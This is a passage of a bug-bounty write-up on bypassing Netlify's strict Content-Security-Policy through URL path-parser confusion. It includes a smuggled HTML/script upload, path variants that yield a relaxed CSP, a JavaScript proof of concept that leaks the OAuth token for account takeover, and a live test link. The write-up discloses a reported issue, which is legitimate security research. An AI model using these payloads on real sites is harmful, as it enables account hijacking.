br<br>Content-Type: multipart/form-data; boundary=---------------------------26024016321888288818835600843<br>Referer: https://app.netlify.com/teams/sudi/overview<br>Content-Length: 606<br>Origin: https://app.netlify.com<br>Sec-Fetch-Dest: empty<br>Sec-Fetch-Mode: cors<br>Sec-Fetch-Site: same-origin<br>Te: trailers<br><br>-----------------------------26024016321888288818835600843<br>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;xss.html&quot;<br>Content-Type: image/png<br><br>&lt;h1&gt;shirley&lt;/h1&gt;&lt;script&gt;alert()&lt;/script&gt;<br>-----------------------------26024016321888288818835600843--</pre><pre>{<br>  &quot;url&quot;: &quot;https://d33wubrfki0l68.cloudfront.net/5d77dc9150223b44a44df1f3/37319cf93ea440b93ea5/xss.html&quot;<br>}</pre><p>As you can see we recieved a successful response, with url which has the .html extension. Now let’s check the Content-Type of the response ..</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1000/0*HJQdly5yptzZvM07" /></figure><p>And voilla we now have a working xss in the CDN domain, I thought now it would easy to get xss in the /.netlify/images?url= endpoint</p><p>But we hit a bummer!! Even though the Content-Type is text/html and the response body contains the xss payload it won’t trigger and is pretty useless due to the <strong><em>CSP </em></strong>being used.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1000/0*Hq_tR9iBzjXHEWfp" /></figure><pre>Content-Security-Policy: script-src &#39;none&#39;</pre><p>This is the CSP which is being used in this endpoint, as I already mentioned this before it’s impossible to bypass this csp. It’s super strict, leaves no room for any bypasses.</p><p>I lost my hope and was about to give up. But next morning I had a random thought, I have been testing Netlify for a couple of days now so had a good idea about their application and all.</p><p>For other endpoints also they have CSP but it’s very relax , in simple terms that one is easy to bypass but this /.netlify/images?url= endpoint returned a different very strict CSP.</p><p>So on the backend side they must be checking the path of the requested url and serving a different CSP especially for it. Just an example nginx conf of how this might be happening</p><pre>    location /.netlify/images {<br>        # Set Content Security Policy<br>        add_header Content-Security-Policy &quot;script-src &#39;none&#39;&quot;;</pre><p>What if there are any URL parsing confusion b/w the service responsible for serving CSP and the service related to fetching the resource. If this is true can I take advantage of it?</p><p>If I can provide a path such that it doesn’t matches with the location directive so nginx isn’t able to catch that but the backend service normalizes the path and treats it as /.netlify/images only so a proper response is returned which doesn’t have the strict CSP</p><p>I started playing with the path</p><pre>GET /./.netlify/images?url=https://d33wubrfki0l68.cloudfront.net/5d77dc9150223b44a44df1f3/37319cf93ea440b93ea5/xss.html&amp;fit=cover&amp;h=200&amp;w=200&amp;x=x HTTP/2<br>Host: app.netlify.com</pre><p>Response:</p><pre>HTTP/2 200 OK<br><br>Content-Security-Policy: script-src &#39;nonce-ak9jJ87J3kkfSFdbapb1h7sEJ/RjVtSQ&#39; &#39;strict-dynamic&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39; &#39;self&#39; https: http: &#39;none&#39;; report-uri /.netlify/functions/__csp-violations<br>Content-Type: text/html</pre><p>Nice the theory really works, I was able to make it return a different CSP but with the same response. But /./.netlify/images if I use such a path in browser it would normalize the url to /.netlify/images before making the request to the sevrer</p><p>Then I tried some url encoding stuff /.netlify%2fimages and this worked perfectly fine I was able to get <strong>xss</strong></p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/0*kXcUxk99-yPy0vvB" /></figure><p>Used a simple poc as this to leak the authorization code from the Github Oauth flow</p><pre>x = window.open(&quot;https://api.netlify.com/auth?provider=github&amp;site_id=app.netlify.com&amp;login=true&amp;redirect=https://app.netlify.com/&quot;);<br><br>setInterval(function() {<br>    console.log(x.location.href);<br>}, 500);</pre><p>I could use this url with the access_tokento login to victim’s account as the access_token in the query param is basically their main session cookie.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/0*6oJjIZ_sMGYgNYHU" /></figure><p>They tried fixing it but soon enough I found another bypass, by just adding a / before the path I was able to bypass the CSP:</p><pre>//.netlify/images</pre><p>This bypass still works you can try playing with the endpoint here</p><p><a href="https://app.netlify.com//.netlify/images?url=https://d33wubrfki0l68.cloudfront.net/5d77dc9150223b44a44df1f3/ce5815cfceaaea304025/xss.html&amp;fit=cover&amp;h=200&amp;w=200&amp;x=x">https://app.netlify.com//.netlify/images?url=https://d33wubrfki0l68.cloudfront.net/5d77dc9150223b44a44df1f3/ce5815cfceaaea304025/xss.html&amp;fit=cover&amp;h=200&amp;w=200&amp;x=x</a></p><p>The url is pointing to an old uploaded html file, Netlify fixed the issue by disallowing the upload of arbitrary files on their CDN Domain and left the url parser bug as it is. As you no longer have a way to upload arbitrary file which can lead to xss they consider this issue to be fixed ¯\_(ツ)_/¯</p><p>I hope you liked the writeup, next time you had to deal with a strict csp maybe try playing with the path and see if you can make the server return a relaxed csp or something which might be easier to bypass than the original one and you can get lucky like me :)</p><img src="https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=755a27065fd9" width="1" height="1" alt=""><hr><p><a href="https://infosecwriteups.com/bypassing-csp-via-url-parser-confusions-xss-on-netlifys-image-cdn-755a27065fd9">Bypassing CSP via URL Parser Confusions : XSS on Netlify’s Image CDN</a> was originally published in <a href="https://infosecwriteups.com">InfoSec Write-ups</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>

  </div><a class="u-url" href="/2024/08/31/bypassing-csp-via-url-parser-confusions-xss-on-netlify-s-image-cdn.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
        <p class="feed-subscribe">
          <a href="http://localhost:4000/feed.xml">
            <svg class="svg-icon orange">
              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
            </svg><span>Subscribe</span>
          </a>
        </p>
        <ul class="contact-list">
          <li class="p-name">sudi</li>
          <li><a class="u-email" href="mailto:sudi[at]wearehackerone.com">sudi[at]wearehackerone.com</a></li>
        </ul>
      </div>
      <div class="footer-col">
        <p>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.
</p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"></ul>
</div>

  </div>

</footer>
</body>

</html>
